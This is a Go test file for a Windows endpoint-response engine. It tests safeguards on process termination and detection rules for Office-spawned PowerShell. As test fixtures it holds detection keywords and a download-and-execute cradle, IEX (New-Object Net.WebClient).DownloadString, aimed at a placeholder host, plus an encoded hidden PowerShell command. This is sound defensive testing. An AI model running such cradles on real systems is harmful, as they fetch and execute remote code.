//go:build windows
// +build windows

package responder

import (
	"context"
	"testing"
	"time"
)

func TestLocalTerminationRefusesUnmeasuredIdentity(t *testing.T) {
	e := &ProcessEngine{}
	called := false
	e.SetTerminator(func(context.Context, map[string]string) (string, error) { called = true; return "mock only", nil })
	for _, base := range []map[string]interface{}{
		{"executable": `C:\tools\sample.exe`},
		{"executable": `C:\tools\sample.exe`, "process_start_time": "invalid"},
	} {
		if _, err := e.terminateMeasured(context.Background(), 12345, base, true); err == nil {
			t.Fatal("unsafe identity accepted")
		}
	}
	if called {
		t.Fatal("unverified process reached terminator")
	}
	e.SetTerminator(func(_ context.Context, params map[string]string) (string, error) {
		if params["pid"] != "12345" || params["kill_tree"] != "true" || params["process_started_at"] == "" {
			t.Fatal(params)
		}
		return "mock only", nil
	})
	if _, err := e.terminateMeasured(context.Background(), 12345, map[string]interface{}{
		"executable": `C:\tools\sample.exe`, "process_start_time": time.Now().UTC().Format(time.RFC3339Nano),
	}, true); err != nil {
		t.Fatal(err)
	}
}

func TestMatchesRule_OfficePowerShellChain(t *testing.T) {
	rule := ProcessRuleMatch{
		ParentNameAny:          []string{"winword.exe", "excel.exe"},
		NameAny:                []string{"powershell.exe"},
		CommandLineContainsAny: []string{" -enc ", "downloadstring"},
	}

	base := map[string]interface{}{
		"parent_name":       "WINWORD.EXE",
		"name":              "powershell.exe",
		"command_line":      `powershell.exe -NoP -W Hidden -enc AAAA`,
		"parent_executable": `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
	}
	if !matchesRule(rule, base) {
		t.Fatalf("expected rule to match office->powershell encoded chain")
	}
}

func TestMatchesRule_CommandLineContainsAll(t *testing.T) {
	rule := ProcessRuleMatch{
		NameAny:                []string{"powershell.exe"},
		CommandLineContainsAll: []string{"-nop", "iex", "downloadstring"},
	}

	base := map[string]interface{}{
		"name":         "powershell.exe",
		"command_line": `powershell.exe -NoP -W Hidden IEX (New-Object Net.WebClient).DownloadString('https://x')`,
	}
	if !matchesRule(rule, base) {
		t.Fatalf("expected all-substring match to succeed")
	}

	base["command_line"] = `powershell.exe -NoP Write-Host ok`
	if matchesRule(rule, base) {
		t.Fatalf("expected all-substring match to fail when one token is missing")
	}
}
